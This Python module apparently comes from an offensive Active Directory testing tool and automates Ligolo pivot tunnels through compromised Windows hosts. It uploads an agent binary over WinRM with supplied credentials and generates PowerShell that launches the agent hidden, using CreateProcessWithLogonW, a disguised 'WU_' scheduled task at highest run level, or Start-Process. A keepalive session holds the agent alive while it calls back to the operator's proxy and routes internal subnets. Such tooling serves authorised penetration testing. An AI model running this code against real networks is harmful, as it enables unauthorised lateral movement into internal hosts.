"""Reusable pivot orchestration helpers.

This module centralizes tunnel-creation logic that should be reusable from
multiple access protocols. Callers provide protocol-specific callbacks for
remote staging/execution while the Ligolo orchestration, UX, persistence, and
post-route verification remain shared.
"""

from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timezone
import hashlib
import json
import secrets
import socket
import threading
import time
from typing import Any, Callable

from rich.markup import escape as rich_escape
from rich.prompt import Confirm, Prompt
from rich.table import Table

from adscan_core.port_diagnostics import (
    is_tcp_bind_address_available,
    parse_host_port,
)
from adscan_internal import (
    print_info,
    print_info_debug,
    print_info_verbose,
    print_instruction,
    print_operation_header,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.ligolo_manager import get_ligolo_agent_local_path
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.ligolo_service import LigoloProxyService


@dataclass(slots=True)
class PivotReachableSubnetSummary:
    """Summarize one subnet that became reachable only through a pivot."""

    prefix_hint: str
    hostnames: list[str]
    ips: list[str]
    reachable_ports: list[int]


def summarize_confirmed_pivot_subnets(
    entries: list[dict[str, Any]],
) -> list[PivotReachableSubnetSummary]:
    """Group confirmed pivot targets by prefix hint for UX and tunnel setup."""

    grouped: dict[str, dict[str, Any]] = {}
    for entry in entries:
        if not isinstance(entry, dict):
            continue
        prefix_hint = str(entry.get("prefix_hint") or "").strip()
        if not prefix_hint:
            ip_value = str(entry.get("ip") or "").strip()
            if ip_value:
                prefix_hint = f"{ip_value}/32"
        if not prefix_hint:
            continue
        bucket = grouped.setdefault(
            prefix_hint,
            {"hostnames": set(), "ips": [], "reachable_ports": set()},
        )
        ip_value = str(entry.get("ip") or "").strip()
        if ip_value and ip_value not in bucket["ips"]:
            bucket["ips"].append(ip_value)
        for hostname in entry.get("hostname_candidates", []):
            hostname_text = str(hostname or "").strip()
            if hostname_text:
                bucket["hostnames"].add(hostname_text)
        for port in entry.get("reachable_ports", []):
            if str(port).isdigit():
                bucket["reachable_ports"].add(int(port))

    summaries = [
        PivotReachableSubnetSummary(
            prefix_hint=prefix_hint,
            hostnames=sorted(bucket["hostnames"], key=str.lower),
            ips=list(bucket["ips"]),
            reachable_ports=sorted(bucket["reachable_ports"]),
        )
        for prefix_hint, bucket in grouped.items()
    ]
    return sorted(summaries, key=lambda item: item.prefix_hint)


def _build_ligolo_interface_name(*, domain: str, pivot_host: str) -> str:
    """Build one deterministic short TUN interface name for a pivot host."""

    digest = hashlib.sha1(f"{domain}|{pivot_host}".encode("utf-8")).hexdigest()[:10]
    return f"lg{digest}"[:15]


def _resolve_ligolo_connect_host(shell: Any, *, listen_addr: str) -> str:
    """Resolve the host/IP that remote agents should use to reach the local proxy."""

    host_part, _separator, _port_text = str(listen_addr or "").strip().rpartition(":")
    normalized_host = host_part.strip()
    if normalized_host and normalized_host not in {"0.0.0.0", "*", "::"}:
        if normalized_host.startswith("[") and normalized_host.endswith("]"):
            return normalized_host[1:-1]
        return normalized_host

    from adscan_internal.services.myip_staleness import check_and_refresh_myip

    myip = check_and_refresh_myip(shell, context="Ligolo pivot")
    if myip:
        return myip
    raise RuntimeError(
        "Cannot determine the Ligolo proxy connect IP. Configure the ADscan 'myip' variable first."
    )


def build_ligolo_agent_start_script(
    *,
    remote_agent_path: str,
    connect_target: str,
    fingerprint: str,
    winrm_username: str = "",
    winrm_domain: str = "",
    winrm_password: str = "",
) -> str:
    """Return one PowerShell script that starts the Ligolo agent in the background."""

    escaped_path = str(remote_agent_path).replace("'", "''")
    escaped_target = str(connect_target).replace("'", "''")
    escaped_fingerprint = str(fingerprint).replace("'", "''")
    escaped_username = str(winrm_username).replace("'", "''")
    escaped_domain = str(winrm_domain).replace("'", "''")
    escaped_password = str(winrm_password).replace("'", "''")
    return rf"""
$ErrorActionPreference = 'Stop'
$agentPath = '{escaped_path}'
$connectTarget = '{escaped_target}'
$fingerprint = '{escaped_fingerprint}'
$winrmUser = '{escaped_username}'
$winrmDomain = '{escaped_domain}'
$winrmPass = '{escaped_password}'
if (-not (Test-Path -LiteralPath $agentPath)) {{
    throw "Ligolo agent binary not found at $agentPath"
}}
$parts = $connectTarget -split ':'
$probeHost = $parts[0]
$probePort = [int]$parts[-1]
$tcpClient = New-Object System.Net.Sockets.TcpClient
try {{
    $connectResult = $tcpClient.BeginConnect($probeHost, $probePort, $null, $null)
    $reachable = $connectResult.AsyncWaitHandle.WaitOne(3000, $false)
    if ($reachable -and -not $tcpClient.Client.Connected) {{ $reachable = $false }}
}} catch {{
    $reachable = $false
}} finally {{
    $tcpClient.Close()
}}
if (-not $reachable) {{
    throw "Ligolo proxy at $connectTarget is not reachable from this host (TCP probe failed)"
}}
# Non-interactive WinRM sessions run inside a Windows Job Object with
# KILL_ON_JOB_CLOSE.  When the script returns and the session closes, the Job
# kills all child processes.
#
# Launch strategy (tried in order):
#   1. CreateProcessWithLogonW (advapi32) — delegates process creation to the
#      Secondary Logon service (seclogon.exe) which runs OUTSIDE the WinRM Job.
#      The new process becomes a child of seclogon, not of PowerShell, so it
#      survives session teardown without requiring elevated rights.  Only needs
#      the account to have "Allow log on locally" and the Seclogon service running
#      (started on demand by Windows automatically).
#   2. Scheduled task — fully independent via Task Scheduler service; typically
#      requires local admin or delegated CIM/WMI rights.
#   3. Start-Process — last resort; will be killed on session close in
#      non-interactive WinRM but covers interactive shell edge cases.
$agentArgs = "-connect $connectTarget -accept-fingerprint $fingerprint -retry -retry-delay 5 -reconnect-timeout 60"
$agentExeName = [System.IO.Path]::GetFileNameWithoutExtension($agentPath)
$launchMethod = 'logon-w'
$procId = $null

try {{
    Add-Type -Language CSharp -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class WinProcLauncherLogonW {{
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessWithLogonW(
        string user, string domain, string pass, uint logonFlags,
        string app, string cmd, uint flags, IntPtr env, string dir,
        ref STARTUPINFO si, out PROCINFO pi);
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {{
        public int cb, r1; public IntPtr desk, title;
        public int x, y, xs, ys, xc, yc, fill, fl; public short sw, r2;
        public IntPtr r3, hin, hout, herr;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCINFO {{ public IntPtr hp, ht; public int pid, tid; }}
    public static int Spawn(string user, string domain, string pass, string cmd) {{
        var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
        PROCINFO pi;
        const uint LOGON_WITH_PROFILE = 1u, CREATE_NO_WINDOW = 0x08000000u;
        return CreateProcessWithLogonW(user, domain, pass, LOGON_WITH_PROFILE,
            null, cmd, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi)
            ? pi.pid : -Marshal.GetLastWin32Error();
    }}
}}
'@ -ErrorAction Stop
    $r = [WinProcLauncherLogonW]::Spawn($winrmUser, $winrmDomain, $winrmPass, "`"$agentPath`" $agentArgs")
    if ($r -le 0) {{ throw "CreateProcessWithLogonW failed (Win32 error=$(-$r))" }}
    $procId = $r
}} catch {{
    # CreateProcessWithLogonW failed — try scheduled task
    $launchMethod = 'schtask'
    try {{
        $taskName = "WU_$(Get-Random -Minimum 10000 -Maximum 99999)"
        $action = New-ScheduledTaskAction -Execute $agentPath -Argument $agentArgs
        $trigger = New-ScheduledTaskTrigger -Once -At '2099-01-01 00:00:00'
        $null = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction Stop
        $null = Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        Start-Sleep -Seconds 3
        $proc = Get-Process -Name $agentExeName -ErrorAction SilentlyContinue | Select-Object -First 1
        $procId = if ($proc) {{ $proc.Id }} else {{ $null }}
        $null = Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }} catch {{
        # Last resort: Start-Process (process may be killed on session close)
        $launchMethod = 'start-process'
        $pargs = @('-connect', $connectTarget, '-accept-fingerprint', $fingerprint, '-retry', '-retry-delay', '5', '-reconnect-timeout', '60')
        $sp = Start-Process -FilePath $agentPath -ArgumentList $pargs -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 2
        $sp.Refresh()
        $procId = if (-not $sp.HasExited) {{ $sp.Id }} else {{ $null }}
    }}
}}

$processAlive = $null -ne $procId
$exitCode = $null
[PSCustomObject]@{{
    started = $true
    pid = $procId
    command = "$agentPath $agentArgs"
    probe_reachable = $true
    process_alive = $processAlive
    exit_code = $exitCode
    launch_method = $launchMethod
}} | ConvertTo-Json -Depth 4 -Compress
"""


def build_ligolo_agent_keepalive_script(
    *,
    remote_agent_path: str,
    connect_target: str,
    fingerprint: str,
    result_path: str,
) -> str:
    """Return a PowerShell script that launches the agent and keeps the WinRM session alive.

    Non-interactive WinRM sessions run in a Job Object with KILL_ON_JOB_CLOSE.
    When a script returns the session closes, the Job closes, and every child
    process (including Start-Process children) is killed.

    This script works around that by *never returning* while the agent is alive:
    after writing the result JSON to ``result_path`` it polls the agent process
    every 15 seconds.  A Python background thread holds the ``execute_ps`` call
    open, which keeps the PSRP RunspacePool (and its wsmprovhost.exe Job Object)
    alive for the entire duration.  When the agent exits the script returns,
    closes the WinRM session, and cleans up the result file.
    """
    escaped_path = str(remote_agent_path).replace("'", "''")
    escaped_target = str(connect_target).replace("'", "''")
    escaped_fingerprint = str(fingerprint).replace("'", "''")
    escaped_result = str(result_path).replace("'", "''")
    return rf"""
$ErrorActionPreference = 'Stop'
$agentPath = '{escaped_path}'
$connectTarget = '{escaped_target}'
$fingerprint = '{escaped_fingerprint}'
$resultPath = '{escaped_result}'
if (-not (Test-Path -LiteralPath $agentPath)) {{
    throw "Ligolo agent binary not found at $agentPath"
}}
$parts = $connectTarget -split ':'
$probeHost = $parts[0]
$probePort = [int]$parts[-1]
$tcpClient = New-Object System.Net.Sockets.TcpClient
try {{
    $connectResult = $tcpClient.BeginConnect($probeHost, $probePort, $null, $null)
    $reachable = $connectResult.AsyncWaitHandle.WaitOne(3000, $false)
    if ($reachable -and -not $tcpClient.Client.Connected) {{ $reachable = $false }}
}} catch {{
    $reachable = $false
}} finally {{
    $tcpClient.Close()
}}
if (-not $reachable) {{
    throw "Ligolo proxy at $connectTarget is not reachable from this host (TCP probe failed)"
}}
$agentArgs = @('-connect', $connectTarget, '-accept-fingerprint', $fingerprint, '-retry', '-retry-delay', '5', '-reconnect-timeout', '60')
$sp = Start-Process -FilePath $agentPath -ArgumentList $agentArgs -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 2
$sp.Refresh()
$processAlive = -not $sp.HasExited
[PSCustomObject]@{{
    started      = $true
    pid          = if ($processAlive) {{ $sp.Id }} else {{ $null }}
    command      = $agentPath
    probe_reachable = $true
    process_alive   = $processAlive
    exit_code    = if ($sp.HasExited) {{ $sp.ExitCode }} else {{ $null }}
    launch_method   = 'start-process-keepalive'
}} | ConvertTo-Json -Depth 4 -Compress | Set-Content -LiteralPath $resultPath -Encoding UTF8
# Keep this WinRM session alive so the agent (in this session's Job Object)
# is not killed when the script returns.  Poll every 15 s until agent exits
# or 1-hour safety timeout is reached.
$deadline = [DateTime]::UtcNow.AddHours(1)
while ([DateTime]::UtcNow -lt $deadline) {{
    $sp.Refresh()
    if ($sp.HasExited) {{ break }}
    Start-Sleep -Seconds 15
}}
Remove-Item -LiteralPath $resultPath -ErrorAction SilentlyContinue
"""


def _build_result_reader_script(result_path: str) -> str:
    """PowerShell one-liner that returns the keepalive result file content, or '{}'."""
    escaped = str(result_path).replace("'", "''")
    return (
        f"if (Test-Path -LiteralPath '{escaped}') "
        f"{{ Get-Content -LiteralPath '{escaped}' -Raw }} else {{ '{{}}' }}"
    )


def probe_ligolo_routed_targets(entries: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Probe confirmed routes locally after Ligolo route creation."""

    verification_results: list[dict[str, Any]] = []
    for entry in entries[:10]:
        if not isinstance(entry, dict):
            continue
        ip_value = str(entry.get("ip") or "").strip()
        if not ip_value:
            continue
        candidate_ports = [
            int(port)
            for port in entry.get("reachable_ports", [])
            if str(port).isdigit()
        ][:6]
        observed_ports: list[int] = []
        for port in candidate_ports:
            try:
                with socket.create_connection((ip_value, int(port)), timeout=1.2):
                    observed_ports.append(int(port))
            except OSError:
                continue
        verification_results.append(
            {
                "ip": ip_value,
                "hostname_candidates": [
                    str(item).strip()
                    for item in entry.get("hostname_candidates", [])
                    if str(item).strip()
                ],
                "expected_ports": candidate_ports,
                "observed_ports": observed_ports,
                "prefix_hint": str(entry.get("prefix_hint") or "").strip(),
            }
        )
    return verification_results


def _render_subnet_table(shell: Any, summaries: list[PivotReachableSubnetSummary]) -> None:
    """Render one concise subnet summary before tunnel creation."""

    if not summaries or not getattr(shell, "console", None):
        return
    table = Table(title="Ligolo Pivot Subnets", box=None)
    table.add_column("Subnet")
    table.add_column("Reachable Hosts")
    table.add_column("Host Preview")
    table.add_column("Port Preview")
    for item in summaries[:10]:
        table.add_row(
            mark_sensitive(item.prefix_hint, "text"),
            str(len(item.ips)),
            ", ".join(mark_sensitive(host, "hostname") for host in item.hostnames[:4]) or "-",
            ", ".join(str(port) for port in item.reachable_ports[:6]) or "-",
        )
    shell.console.print(table)


def _is_default_ligolo_port_conflict(error: Exception) -> bool:
    """Return whether one exception represents the default Ligolo port conflict path."""

    return "No default ligolo egress port is available" in str(error or "")


def _prompt_ligolo_listen_recovery_action() -> str:
    """Prompt for the next action when Ligolo default egress ports are unavailable."""

    return str(
        Prompt.ask(
            "Ligolo proxy recovery action",
            choices=["retry", "custom", "skip"],
            default="retry",
        )
        or "retry"
    ).strip().lower()


def _resolve_ligolo_listen_addr_with_recovery(
    service: LigoloProxyService, *, pivot_host: str
) -> str | None:
    """Resolve one listen address and recover locally from default port conflicts."""

    while True:
        try:
            return service.resolve_default_listen_addr()
        except Exception as exc:  # noqa: BLE001
            if not _is_default_ligolo_port_conflict(exc):
                raise
            print_warning(
                f"Ligolo default egress ports are unavailable for {mark_sensitive(pivot_host, 'hostname')}: "
                f"{rich_escape(str(exc))}"
            )
            print_instruction("Free 443 or 80 on the base host, then choose 'retry' to continue here.")
            print_instruction(
                "If the pivot host can only egress to another port by design, choose 'custom' and provide it explicitly."
            )
            action = _prompt_ligolo_listen_recovery_action()
            if action == "skip":
                print_info("Skipping Ligolo tunnel creation for now.")
                return None
            if action == "retry":
                print_info("Retrying Ligolo default egress port selection.")
                continue
            while True:
                custom_addr = str(
                    Prompt.ask(
                        "Enter the Ligolo proxy listen address",
                        default="0.0.0.0:8443",
                    )
                    or ""
                ).strip()
                try:
                    parse_host_port(custom_addr)
                except Exception:
                    print_warning("Invalid listen address format. Use host:port, for example 0.0.0.0:8443.")
                    continue
                if not is_tcp_bind_address_available(custom_addr):
                    print_warning(
                        f"Custom Ligolo listen address {mark_sensitive(custom_addr, 'host')} is still busy."
                    )
                    continue
                print_info(
                    f"Using custom Ligolo listen address {mark_sensitive(custom_addr, 'host')} by operator choice."
                )
                return custom_addr


def orchestrate_ligolo_pivot_tunnel(
    shell: Any,
    *,
    domain: str,
    pivot_host: str,
    username: str,
    password: str,
    confirmed_targets: list[dict[str, Any]],
    detect_remote_architecture: Callable[..., str],
    upload_agent: Callable[..., bool],
    execute_remote_script: Callable[..., str],
    remote_agent_os: str = "windows",
) -> None:
    """Create one Ligolo tunnel for confirmed pivot subnets and verify the routes."""

    workspace_dir = str(getattr(shell, "current_workspace_dir", "") or "").strip()
    if not workspace_dir:
        print_info_debug(
            "Skipping Ligolo pivot tunnel automation: no active workspace is loaded."
        )
        return

    subnet_summaries = summarize_confirmed_pivot_subnets(confirmed_targets)
    if not subnet_summaries:
        print_info_debug(
            "Skipping Ligolo pivot tunnel automation: no subnet summaries were derived from confirmed targets."
        )
        return

    _render_subnet_table(shell, subnet_summaries)
    print_info(
        f"{len(subnet_summaries)} subnet(s) behind {mark_sensitive(pivot_host, 'hostname')} appear suitable for a Ligolo tunnel. "
        "This will route the selected prefixes through the pivot so existing ADscan tooling can reach those hosts directly."
    )
    default_confirm = str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
    if not Confirm.ask(
        (
            f"Do you want to create a Ligolo tunnel via {mark_sensitive(pivot_host, 'hostname')} "
            f"for {len(subnet_summaries)} reachable subnet(s)?"
        ),
        default=default_confirm,
    ):
        print_info("Skipping Ligolo tunnel creation by user choice.")
        return

    try:
        service = LigoloProxyService(workspace_dir=workspace_dir, current_domain=domain)
        proxy_state = service.get_status()
        if not bool(proxy_state.get("alive")):
            listen_addr = _resolve_ligolo_listen_addr_with_recovery(
                service,
                pivot_host=pivot_host,
            )
            if not listen_addr:
                return
            print_operation_header(
                "Ligolo Pivot Tunnel",
                details={
                    "Domain": domain,
                    "Pivot Host": pivot_host,
                    "Listen": listen_addr,
                    "API": proxy_state.get("api_laddr") or "127.0.0.1:8080",
                    "Subnets": str(len(subnet_summaries)),
                    "Host Count": str(len(confirmed_targets)),
                },
                icon="🧭",
            )
            proxy_state = service.start_proxy(listen_addr=listen_addr)
        else:
            print_operation_header(
                "Ligolo Pivot Tunnel",
                details={
                    "Domain": domain,
                    "Pivot Host": pivot_host,
                    "Listen": proxy_state.get("listen_addr") or "unknown",
                    "API": proxy_state.get("api_laddr") or "unknown",
                    "Subnets": str(len(subnet_summaries)),
                    "Host Count": str(len(confirmed_targets)),
                },
                icon="🧭",
            )

        service.wait_for_api_ready()
        connect_host = _resolve_ligolo_connect_host(
            shell, listen_addr=str(proxy_state.get("listen_addr") or "")
        )
        connect_target = (
            f"{connect_host}:{str(proxy_state.get('listen_addr') or '').rpartition(':')[2]}"
        )
        fingerprint = service.get_server_fingerprint()

        architecture = detect_remote_architecture(
            domain=domain,
            host=pivot_host,
            username=username,
            password=password,
        )
        agent_path = get_ligolo_agent_local_path(
            target_os=remote_agent_os, arch=architecture
        )
        if agent_path is None:
            raise RuntimeError(
                f"Ligolo {remote_agent_os} agent is not available for architecture {architecture}. "
                "Ensure the pinned asset is present in the runtime cache."
            )

        extension = ".exe" if str(remote_agent_os).lower() == "windows" else ""
        remote_agent_name = (
            f"adscan_ligolo_{hashlib.sha1(pivot_host.encode('utf-8')).hexdigest()[:8]}_{int(time.time())}{extension}"
        )
        remote_agent_path = (
            rf"C:\Windows\Temp\{remote_agent_name}"
            if str(remote_agent_os).lower() == "windows"
            else f"/tmp/{remote_agent_name}"
        )
        if not upload_agent(
            domain=domain,
            host=pivot_host,
            username=username,
            password=password,
            local_path=str(agent_path),
            remote_path=remote_agent_path,
        ):
            raise RuntimeError(
                f"Failed to upload the Ligolo agent to {remote_agent_path}."
            )

        known_session_ids = {
            str(agent.get("session_id") or "").strip()
            for agent in service.list_agents()
            if str(agent.get("session_id") or "").strip()
        }
        # Windows: launch the agent via a keepalive WinRM session.
        #
        # Non-interactive WinRM sessions put all child processes in a Job Object
        # with KILL_ON_JOB_CLOSE.  When a script returns the session closes, the
        # Job closes, and the agent is killed — before the tunnel can connect.
        #
        # Fix: run the agent launch + polling loop in a background Python thread
        # that calls execute_remote_script and blocks for up to 1 hour.  The
        # PSRP RunspacePool (and its wsmprovhost.exe Job Object) stays open for
        # as long as that background thread is alive, keeping the agent process
        # alive with it.  The keepalive script writes a result JSON to a temp
        # file; the main thread polls for that file via a separate short-lived
        # WinRM call, then proceeds with Ligolo API setup.
        result_token = secrets.token_hex(8)
        result_path = rf"C:\Windows\Temp\adscan_l{result_token}.json"
        keepalive_script = build_ligolo_agent_keepalive_script(
            remote_agent_path=remote_agent_path,
            connect_target=connect_target,
            fingerprint=fingerprint,
            result_path=result_path,
        )
        keepalive_errors: list[Exception] = []

        def _run_keepalive() -> None:
            try:
                execute_remote_script(
                    domain=domain,
                    host=pivot_host,
                    username=username,
                    password=password,
                    script=keepalive_script,
                    operation_name="ligolo_agent_keepalive",
                )
            except Exception as exc:  # noqa: BLE001
                keepalive_errors.append(exc)

        print_info_verbose("Launching Ligolo agent on target via keepalive WinRM session…")
        keepalive_thread = threading.Thread(
            target=_run_keepalive, daemon=True, name="ligolo-keepalive"
        )
        keepalive_thread.start()

        # Poll for the result file written by the keepalive script (~3s after launch).
        result_reader = _build_result_reader_script(result_path)
        launch_payload: dict[str, Any] = {}
        poll_deadline = time.time() + 40.0
        while time.time() < poll_deadline:
            time.sleep(2.0)
            if keepalive_errors:
                raise RuntimeError(
                    f"Ligolo agent keepalive failed before writing result: {keepalive_errors[0]}"
                )
            try:
                read_stdout = execute_remote_script(
                    domain=domain,
                    host=pivot_host,
                    username=username,
                    password=password,
                    script=result_reader,
                    operation_name="ligolo_agent_result_read",
                )
                raw = (read_stdout or "{}").strip()
                if raw and raw not in ("{}", ""):
                    launch_payload = json.loads(raw)
                    break
            except Exception:  # noqa: BLE001
                continue

        if not isinstance(launch_payload, dict) or not launch_payload.get("started"):
            raise RuntimeError(
                "Ligolo agent keepalive script did not return a successful result within 40s."
            )

        # Quick liveness check: if the process already died 2 seconds after launch,
        # it was most likely killed by AV/EDR before making any network connection.
        if launch_payload.get("process_alive") is False:
            exit_code = launch_payload.get("exit_code")
            raise RuntimeError(
                f"Ligolo agent process exited immediately after launch "
                f"(exit_code={exit_code}). "
                f"The binary was likely quarantined by antivirus/EDR on the target host."
            )

        print_info_debug(
            f"Agent launch method: {launch_payload.get('launch_method', 'unknown')} | "
            f"PID: {launch_payload.get('pid')}"
        )
        print_info_verbose(
            f"Agent process alive on target (PID {launch_payload.get('pid')}). "
            f"Keepalive WinRM session is holding the Job Object open. "
            f"Waiting for proxy connection…"
        )

        # Agent is launched with -retry -retry-delay 5 -reconnect-timeout 60.
        # Wait slightly beyond that window so ADscan doesn't time out before
        # the agent exhausts its own retries.
        agent = service.wait_for_new_agent(known_session_ids=known_session_ids, timeout_seconds=70.0)
        routes = [item.prefix_hint for item in subnet_summaries if item.prefix_hint]
        interface_name = _build_ligolo_interface_name(
            domain=domain, pivot_host=pivot_host
        )
        print_info_verbose(
            f"Configuring tunnel interface {interface_name!r} with {len(routes)} route(s): {', '.join(routes)}"
        )
        service.ensure_interface(interface_name)
        added_routes = service.ensure_routes(interface_name=interface_name, routes=routes)
        service.ensure_tunnel_started(
            agent_id=int(agent["id"]), interface_name=interface_name
        )

        # Monitor thread: waits for the keepalive thread to exit and notifies
        # the user immediately, since a dead keepalive means the WinRM Job Object
        # closed and the agent process was killed (tunnel will drop).
        _monitor_iface = interface_name
        _monitor_host = pivot_host

        def _monitor_keepalive() -> None:
            keepalive_thread.join()
            if keepalive_errors:
                print_warning(
                    f"Ligolo keepalive WinRM session for "
                    f"{mark_sensitive(_monitor_host, 'hostname')} ended with an error — "
                    f"the agent process was likely killed and the tunnel on "
                    f"{mark_sensitive(_monitor_iface, 'text')} may be down.",
                    items=[rich_escape(str(keepalive_errors[0]))],
                    panel=True,
                    spacing="before",
                )
            else:
                print_warning(
                    f"Ligolo keepalive WinRM session for "
                    f"{mark_sensitive(_monitor_host, 'hostname')} ended — "
                    f"the agent process exited or the 1-hour safety timeout was reached. "
                    f"Tunnel on {mark_sensitive(_monitor_iface, 'text')} may be down.",
                    spacing="before",
                )

        threading.Thread(
            target=_monitor_keepalive, daemon=True, name="ligolo-keepalive-monitor"
        ).start()
        print_info_verbose(
            f"Keepalive monitor active — you will be notified if the WinRM session "
            f"for {mark_sensitive(pivot_host, 'hostname')} drops."
        )

        verification_results = probe_ligolo_routed_targets(confirmed_targets)
        verified_targets = [
            entry for entry in verification_results if entry.get("observed_ports")
        ]
        tunnel_record = {
            "created_at": datetime.now(timezone.utc).isoformat(),
            "domain": domain,
            "pivot_host": pivot_host,
            "pivot_username": username,
            "proxy_listen_addr": proxy_state.get("listen_addr"),
            "proxy_api_laddr": proxy_state.get("api_laddr"),
            "connect_target": connect_target,
            "fingerprint": fingerprint,
            "remote_agent_path": remote_agent_path,
            "remote_agent_pid": launch_payload.get("pid"),
            "agent": agent,
            "interface_name": interface_name,
            "routes": routes,
            "new_routes": added_routes,
            "confirmed_targets": confirmed_targets,
            "verification": verification_results,
        }
        service.append_tunnel_state(tunnel_record)

        print_success(
            f"Ligolo tunnel created through {mark_sensitive(pivot_host, 'hostname')} on "
            f"{mark_sensitive(interface_name, 'text')} for {len(routes)} route(s)."
        )
        if getattr(shell, "console", None):
            verification_table = Table(title="Ligolo Route Verification", box=None)
            verification_table.add_column("IP")
            verification_table.add_column("Hostname(s)")
            verification_table.add_column("Observed Ports")
            verification_table.add_column("Expected Ports")
            for entry in verification_results[:10]:
                verification_table.add_row(
                    mark_sensitive(str(entry.get("ip") or ""), "ip"),
                    ", ".join(
                        mark_sensitive(host, "hostname")
                        for host in entry.get("hostname_candidates", [])
                    )
                    or "-",
                    ", ".join(str(port) for port in entry.get("observed_ports", []))
                    or "-",
                    ", ".join(str(port) for port in entry.get("expected_ports", []))
                    or "-",
                )
            shell.console.print(verification_table)
        if verified_targets:
            print_success(
                f"Post-tunnel verification succeeded for {len(verified_targets)} hidden target(s) from the current vantage."
            )
        else:
            print_warning(
                "Ligolo tunnel started, but the immediate local verification did not observe any expected ports yet."
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning(
            f"Ligolo pivot tunnel creation failed for {mark_sensitive(pivot_host, 'hostname')}: {rich_escape(str(exc))}"
        )
        if "No default ligolo egress port is available" in str(exc):
            print_instruction("Inspect listeners with: ss -ltnp '( sport = :443 or sport = :80 )'")
            print_instruction(
                "After freeing one default port, retry the tunnel workflow. "
                "If you must use another port, start the proxy explicitly with: ligolo proxy start 0.0.0.0:<port>"
            )


__all__ = [
    "PivotReachableSubnetSummary",
    "build_ligolo_agent_keepalive_script",
    "build_ligolo_agent_start_script",
    "orchestrate_ligolo_pivot_tunnel",
    "probe_ligolo_routed_targets",
    "summarize_confirmed_pivot_subnets",
]
